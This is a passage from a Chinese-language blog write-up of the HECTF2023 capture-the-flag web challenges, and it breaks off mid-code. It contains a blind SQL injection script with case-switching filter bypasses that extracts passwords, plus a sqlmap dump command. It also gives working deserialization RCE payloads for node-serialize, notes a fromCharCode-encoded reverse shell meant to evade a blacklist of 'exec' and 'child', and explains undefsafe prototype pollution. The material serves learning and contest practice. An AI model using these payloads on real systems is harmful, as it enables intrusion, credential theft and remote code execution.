    <content type="html"><![CDATA[<h1 id="HECTF2023-WEB-复现"><a href="#HECTF2023-WEB-复现" class="headerlink" title="HECTF2023-WEB 复现"></a>HECTF2023-WEB 复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当时报了名，但是忘记打了，快结束了上号看了一下好像都挺难的，都没怎么有思路</p><p>唉，太菜了</p><p>有的题没有给源代码，就只看看wp，其他的靠当时下载的附件，</p><h2 id="EZweb"><a href="#EZweb" class="headerlink" title="EZweb"></a>EZweb</h2><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114163734067.png" alt="image-20240114163734067"></p><p>大概就是这两个信息，然后sort传一次票数就增加</p><p>当时一点思路没有，痛苦</p><p>下面看wp</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114163915092.png" alt="image-20240114163915092"></p><p>访问</p><p>跳转的投票界面</p><p>测了好久发现是sql注入，太不明显了！！！！</p><p>然后就可以使用sqlmap进行梭哈</p><p>1.txt</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /<span class="hljs-number">404</span>.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">101.133.164.228:32385</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">109</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">119</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">6</span><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">101.133.164.228:32385</span><span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">101.133.164.228:32385</span>/<span class="hljs-number">404</span>.php<span class="hljs-attribute">Cookie</span>: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjExIn0.YrHwWF1RRyxqpta2G-dnwRRjoq53lCOLYVxv4l_BLMI; seed=<span class="hljs-number">976696390</span><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">sort</span>=<span class="hljs-number">1</span></code></pre></div><p>python3 sqlmap.py -r 1.txt -D ctf -T users  -dump -batch</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114164211302.png" alt="image-20240114164211302"></p><p>官方wp使用的盲注</p><p><strong>过滤了and、select、sleep，大写绕过即可</strong></p><div class="code-wrapper"><pre><code class="hljs gauss">import requests import <span class="hljs-built_in">time</span>  url = &#x27;http:<span class="hljs-comment">//101.132.112.252:31474/404.php&#x27;</span>  flag = &#x27;&#x27; <span class="hljs-meta">#qsnctf  q 113</span> <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):     high = 127     low = 32     mid = (low + high) // 2     while high &gt; low:         payload = f&quot;-1&#x27;<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>if(<span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substr</span>(<span class="hljs-built_in">database</span>(),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-built_in">SLEEP</span>(<span class="hljs-number">4</span>),<span class="hljs-number">1</span>)#&quot;       #查库名   users         payload = f&quot;-1&#x27;<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>if(<span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substr</span>((<span class="hljs-built_in">seleCt</span>(<span class="hljs-built_in">group_concat</span>(table_name))<span class="hljs-built_in">from</span>(infORmation_schema.tables)<span class="hljs-built_in">where</span>(table_schema)=&#x27;ctf&#x27;),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-built_in">SLEEP</span>(<span class="hljs-number">4</span>),<span class="hljs-number">1</span>)#&quot;        #查表名        # payload = f&quot;-1&#x27;<span class="hljs-comment">/**/</span>AND<span class="hljs-comment">/**/</span>if(<span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substr</span>((<span class="hljs-built_in">seleCt</span>(<span class="hljs-built_in">group_concat</span>(column_name))<span class="hljs-built_in">from</span>(infORmation_schema.columns)<span class="hljs-built_in">where</span>(table_name)=&#x27;users&#x27;),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-built_in">SLEEP</span>(<span class="hljs-number">4</span>),<span class="hljs-number">1</span>)#&quot;        #查列名         # payload = f&quot;1&#x27;<span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span>if(<span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substr</span>((<span class="hljs-built_in">seleCt</span>(password)<span class="hljs-built_in">from</span>(users)),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-built_in">sleep</span>(<span class="hljs-number">4</span>),<span class="hljs-number">1</span>)--+&quot;       #查数据        #  payload = f&quot;1&#x27;<span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span>if(<span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substr</span>((<span class="hljs-built_in">select</span>(<span class="hljs-built_in">group_concat</span>(password))<span class="hljs-built_in">from</span>(users)),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-built_in">sleep</span>(<span class="hljs-number">4</span>),<span class="hljs-number">1</span>)#&quot;        #查列名           payload=f&quot;-1&#x27;<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>if(<span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substr</span>((<span class="hljs-built_in">selecT</span>(<span class="hljs-built_in">group_concat</span>(password))<span class="hljs-built_in">from</span>(users)),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-built_in">SLEEP</span>(<span class="hljs-number">4</span>),<span class="hljs-number">1</span>)#&quot;          data = &#123;             &quot;sort&quot;:payload        &#125;          last = int(<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>())         response = requests.post(url, data = data)         now = int(<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>())           if now - last &gt; 3 :             low = mid + 1         else :             high = mid         mid = (low + high) // 2     if low != 3232:         flag += chr(<span class="hljs-built_in">int</span>(low))     else:         break     print(flag)</code></pre></div><p>测不出是sql是真没办法</p><h2 id="EZjs"><a href="#EZjs" class="headerlink" title="EZjs"></a>EZjs</h2><p>这题有附件</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<span class="hljs-keyword">const</span> flag=<span class="hljs-string">&quot;*****************&quot;</span><span class="hljs-keyword">var</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node-serialize&#x27;</span>);<span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<span class="hljs-keyword">class</span> <span class="hljs-title class_">Brief</span> &#123;    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">owner</span> = <span class="hljs-string">&quot;whoknows&quot;</span>;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = <span class="hljs-number">0</span>;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctfer</span> = &#123;&#125;;    &#125;    <span class="hljs-title function_">write_ctfer</span>(<span class="hljs-params">name, nickname</span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctfer</span>[(<span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>++).<span class="hljs-title function_">toString</span>()] = &#123;            <span class="hljs-string">&quot;name&quot;</span>: name,            <span class="hljs-string">&quot;nickname&quot;</span>: nickname        &#125;;    &#125;    <span class="hljs-title function_">edit_ctfer</span>(<span class="hljs-params">id, name, nikename</span>) &#123;        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">ctfer</span>, id + <span class="hljs-string">&#x27;.name&#x27;</span>, name);        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">ctfer</span>, id + <span class="hljs-string">&#x27;.nikename&#x27;</span>, nikename);    &#125;    <span class="hljs-title function_">remove_ctfer</span>(<span class="hljs-params">id</span>) &#123;        <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctfer</span>[id];    &#125;&#125;<span class="hljs-keyword">var</span> introduction = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Brief</span>();introduction.<span class="hljs-title function_">write_ctfer</span>(<span class="hljs-string">&quot;the first name&quot;</span>, <span class="hljs-string">&quot;the first nickname&quot;</span>);app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123;    <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span>&#125;));app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123;        <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Welcome to ctfer\&#x27;s brief introduction&#x27;</span>    &#125;);&#125;);app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/add&#x27;</span>)    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;            <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Please use post to pass parameters&#x27;</span>        &#125;);    &#125;)    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;        <span class="hljs-keyword">let</span> name = req.<span class="hljs-property">body</span>.<span class="hljs-property">name</span>;        <span class="hljs-keyword">let</span> nickname = req.<span class="hljs-property">body</span>.<span class="hljs-property">nickname</span>;        <span class="hljs-keyword">if</span> (name &amp;&amp; nickname) &#123;            introduction.<span class="hljs-title function_">write_ctfer</span>(name, nickname);            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;添加成功&quot;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;添加失败&quot;</span>);        &#125;    &#125;)app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit&#x27;</span>)    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;开始修改&quot;</span>);    &#125;)    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;        <span class="hljs-keyword">let</span> name = req.<span class="hljs-property">body</span>.<span class="hljs-property">name</span>;        <span class="hljs-keyword">let</span> nickname = req.<span class="hljs-property">body</span>.<span class="hljs-property">nickname</span>;        <span class="hljs-keyword">if</span> (id &amp;&amp; name &amp;&amp; nickname) &#123;            introduction.<span class="hljs-title function_">edit_ctfer</span>(id, name, nickname);            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;修改成功&quot;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;           res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;修改失败&quot;</span>);        &#125;    &#125;)app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/delete&#x27;</span>)    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;            &#125;)    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;        <span class="hljs-keyword">if</span> (id) &#123;            introduction.<span class="hljs-title function_">remove_ctfer</span>(id);                    &#125; <span class="hljs-keyword">else</span> &#123;                    &#125;    &#125;)app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/getflag&#x27;</span>) .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;    <span class="hljs-keyword">let</span> array1=&#123;<span class="hljs-attr">IIS</span>:<span class="hljs-number">123</span>,<span class="hljs-attr">a</span>:<span class="hljs-number">234</span>,<span class="hljs-attr">b</span>:<span class="hljs-number">345</span>&#125;    <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">black1</span>(q))&#123;        <span class="hljs-keyword">if</span>(array1[q.<span class="hljs-title function_">toUpperCase</span>()]==<span class="hljs-number">123</span>)&#123;            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;            <span class="hljs-attr">message</span>: flag        &#125;);        &#125;    &#125;&#125;)app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/excite&#x27;</span>)    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;        <span class="hljs-keyword">let</span> commands = &#123;            <span class="hljs-string">&quot;less1&quot;</span>: <span class="hljs-string">&quot;Error&quot;</span>,            <span class="hljs-string">&quot;less2&quot;</span>: <span class="hljs-string">&quot;Correct&quot;</span>        &#125;;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(commands[index])            <span class="hljs-keyword">if</span>(<span class="hljs-title function_">black2</span>(commands[index]))&#123;                <span class="hljs-keyword">try</span>&#123;                    serialize.<span class="hljs-title function_">unserialize</span>(commands[index]);                &#125;<span class="hljs-keyword">catch</span> (e)&#123;                    <span class="hljs-keyword">continue</span>;                &#125;            &#125;&#125;        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ok&quot;</span>);        res.<span class="hljs-title function_">end</span>();    &#125;)app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);&#125;);app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">err, req, res, next</span>) &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);&#125;);<span class="hljs-keyword">function</span> <span class="hljs-title function_">black1</span>(<span class="hljs-params">arr</span>) &#123;    <span class="hljs-keyword">let</span> blacklist = [<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;I&quot;</span>];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-property">length</span>; i++) &#123;        <span class="hljs-keyword">const</span> element = arr[i];        <span class="hljs-keyword">if</span> (blacklist.<span class="hljs-title function_">includes</span>(element)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">black2</span>(<span class="hljs-params">arr</span>) &#123;    <span class="hljs-keyword">let</span> blacklist = [<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>,<span class="hljs-string">&quot;WEB&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;require&quot;</span>,<span class="hljs-string">&quot;child&quot;</span>,<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;&amp;&quot;</span>];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-property">length</span>; i++) &#123;        <span class="hljs-keyword">const</span> element = arr[i];        <span class="hljs-keyword">if</span> (blacklist.<span class="hljs-title function_">includes</span>(element)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-keyword">const</span> port = <span class="hljs-number">80</span>;app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))</code></pre></div><p>看了一遍代码，black1可以使用javascript的大小写特性来绕过，但不知道有什么用</p><div class="code-wrapper"><pre><code class="hljs gcode"><span class="hljs-string">&quot;ı&quot;</span>.toUpperCase<span class="hljs-comment">()</span> == <span class="hljs-string">&#x27;I&#x27;</span>，<span class="hljs-string">&quot;ſ&quot;</span>.toUpperCase<span class="hljs-comment">()</span> == <span class="hljs-string">&#x27;S&#x27;</span></code></pre></div><p>不知道漏洞在哪时可以看依赖，通常题目就是出的依赖的CVE</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;dependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;express&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^4.17.1&quot;</span><span class="hljs-punctuation">,</span>        <span class="hljs-attr">&quot;pug&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^2.0.4&quot;</span><span class="hljs-punctuation">,</span>        <span class="hljs-attr">&quot;undefsafe&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2.0.1&quot;</span><span class="hljs-punctuation">,</span>        <span class="hljs-attr">&quot;node-serialize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.0.4&quot;</span><span class="hljs-punctuation">,</span>        <span class="hljs-attr">&quot;cookie-parser&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^1.4.3&quot;</span><span class="hljs-punctuation">,</span>        <span class="hljs-attr">&quot;escape-html&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^1.0.3&quot;</span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>当时看的时候注意到的是<code>node-serialize</code>这个库，当时认为这个肯定有CVE，看了wp，确实是这样</p><p>我自己对着库寻找漏洞，找到两篇文章</p><p><a href="https://xianbeil.github.io/2022/03/14/undefsafeStudy/">Undefsafe模块原型链污染(CVE-2019-10795) (xianbeil.github.io)</a></p><p><a href="https://cloud.tencent.com/developer/article/1374840">CVE-2017-5941: 利用Node.js反序列化漏洞执行远程代码-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>分别是<code>undefsafe</code>的原型链污染，<code>node-serialize</code>的反序列化漏洞</p><p>基本上合起来就是官方wp了</p><h3 id="undefsafe"><a href="#undefsafe" class="headerlink" title="undefsafe"></a>undefsafe</h3><p>当我们访问一个对象不存在的属性时，会报错然后退出程序，undefsafe帮我们解决了这个问题</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">var</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<span class="hljs-keyword">var</span> <span class="hljs-built_in">object</span> = &#123;    <span class="hljs-attr">a</span>: &#123;        <span class="hljs-attr">b</span>: &#123;            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;test&#x27;</span>        &#125;    &#125;&#125;;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">object</span>.<span class="hljs-property">a</span>.<span class="hljs-property">c</span>.<span class="hljs-property">e</span>);<span class="hljs-comment">//Uncaught TypeError TypeError: Cannot read properties of undefined (reading &#x27;e&#x27;)</span><span class="hljs-comment">//错误并退出程序</span><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">undefsafe</span>(<span class="hljs-built_in">object</span>,<span class="hljs-string">&quot;a.c.e&quot;</span>));<span class="hljs-comment">//undefined</span></code></pre></div><p>为一个不存在的属性赋值时，会在其上层赋值</p><div class="code-wrapper"><pre><code class="hljs pgsql">var undefsafe = require(&quot;undefsafe&quot;);var <span class="hljs-keyword">object</span> = &#123;    a: &#123;        b: &#123;            c: <span class="hljs-number">1</span>,            d: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],            e: <span class="hljs-string">&#x27;test&#x27;</span>        &#125;    &#125;&#125;;undefsafe(<span class="hljs-keyword">object</span>,<span class="hljs-string">&#x27;a.c.name&#x27;</span>,<span class="hljs-string">&#x27;xianbei&#x27;</span>);//undefsafe(<span class="hljs-keyword">object</span>,<span class="hljs-string">&#x27;a.name&#x27;</span>,<span class="hljs-string">&#x27;xianbei&#x27;</span>);   //直接a.name结果也是一样的console.log(<span class="hljs-keyword">object</span>);</code></pre></div><div class="code-wrapper"><pre><code class="hljs css">//结果&#123; <span class="hljs-selector-tag">a</span>: &#123; <span class="hljs-selector-tag">b</span>: &#123; c: <span class="hljs-number">1</span>, d: [Array], e: <span class="hljs-string">&#x27;test&#x27;</span> &#125;, name: <span class="hljs-string">&#x27;xianbei&#x27;</span>      //name与b是同一级&#125; &#125;</code></pre></div><p>那很明显利用方式就是<code>__proto__</code> 进行原型链污染</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">var</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<span class="hljs-keyword">var</span> <span class="hljs-built_in">object</span> = &#123;    <span class="hljs-attr">a</span>: &#123;        <span class="hljs-attr">b</span>: &#123;            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;test&#x27;</span>        &#125;    &#125;&#125;;<span class="hljs-title function_">undefsafe</span>(<span class="hljs-built_in">object</span>,<span class="hljs-string">&#x27;__proto__.name&#x27;</span>,<span class="hljs-string">&#x27;xianbei&#x27;</span>);<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">object</span>.<span class="hljs-property">name</span>);<span class="hljs-comment">//xianbei</span></code></pre></div><h3 id="node-serialize"><a href="#node-serialize" class="headerlink" title="node-serialize"></a>node-serialize</h3><p>unserialize 内部有这么一段代码</p><div class="code-wrapper"><pre><code class="hljs text">if (obj[key].indexOf(&#x27;_$$ND_FUNC$$_&#x27;) === 0) &#123;  obj[key] = eval(&#x27;(&#x27; + obj[key].substring(&#x27;_$$ND_FUNC$$_&#x27;.length) + &#x27;)&#x27;);&#125;</code></pre></div><p>如果用户输入 <code>&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_process.exit()&quot;&#125;</code></p><p>就相当于执行<code>eval(&#39;(process.exit())&#39;)</code>，就会退出程序</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> y = &#123;   <span class="hljs-attr">rce</span> : <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; require(<span class="hljs-string">&#x27;child_process&#x27;</span>).exec(<span class="hljs-string">&#x27;ls /&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>) &#123; <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(stdout) &#125;); &#125;,&#125;<span class="hljs-keyword">var</span> serialize = require(<span class="hljs-string">&#x27;node-serialize&#x27;</span>);  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Serialized: \n&quot;</span> + serialize.serialize(y));</code></pre></div><div class="code-wrapper"><pre><code class="hljs scilab">Serialized: &#123;<span class="hljs-string">&quot;rce&quot;</span>:<span class="hljs-string">&quot;_$$ND_FUNC$$_function()&#123;\r\n        require(&#x27;</span>child_process&#x27;).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(error, stdout, stderr)</span> &#123; <span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(stdout)</span> &#125;);\<span class="hljs-title">r</span>\<span class="hljs-title">n</span>    &#125;&quot;&#125;  </span></code></pre></div><p>那么问题来了，怎么代码执行呢？只有触发对象的 rce 成员函数才行。</p><p>可以使用 JavaScript 的立即调用的函数表达式（IIFE）来调用该函数。如果我们在函数后使用 IIFE 括号 <code>()</code> ，在对象被创建时，函数就会马上被调用</p><p>加了之后无法显示出序列化的结果，所以我们直接在前面序列化的结果中加<code>()</code></p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114195253057.png" alt="image-20240114195253057"></p><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><div class="code-wrapper"><pre><code class="hljs scilab">&#123;<span class="hljs-string">&quot;rce&quot;</span>:<span class="hljs-string">&quot;_$$ND_FUNC$$_function ()&#123;\n \t require(&#x27;</span>child_process&#x27;).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(error, stdout, stderr)</span> &#123; <span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(stdout)</span> &#125;);\<span class="hljs-title">n</span> &#125;<span class="hljs-params">()</span>&quot;&#125;  </span></code></pre></div><h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>了解完原理后，这题的话有黑名单，可以使用参考文章中的<a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">Node.Js-Security-Course&#x2F;nodejsshell.py at master · ajinabraham&#x2F;Node.Js-Security-Course (github.com)</a>脚本</p><p>生成使用String.fromCharCode来反弹shell的payload，以此绕过黑名单</p><div class="code-wrapper"><pre><code class="hljs powershell">&#123;<span class="hljs-string">&quot;rce&quot;</span>:<span class="hljs-string">&quot;_<span class="hljs-variable">$</span><span class="hljs-variable">$ND_FUNC</span><span class="hljs-variable">$</span><span class="hljs-variable">$_function</span> ()&#123; eval(String.fromCharCode(10,118,97,....))&#125;()&quot;</span>&#125;</code></pre></div><p>然后是原型链污染的部分，因为只有</p><div class="code-wrapper"><pre><code class="hljs xquery">edit_ctfer<span class="hljs-built_in">(id</span>,<span class="hljs-built_in"> name</span>, nikename) &#123;    undefsafe(this.ctfer,<span class="hljs-built_in"> id</span> + <span class="hljs-string">&#x27;.name&#x27;</span>,<span class="hljs-built_in"> name</span>);    undefsafe(this.ctfer,<span class="hljs-built_in"> id</span> + <span class="hljs-string">&#x27;.nikename&#x27;</span>, 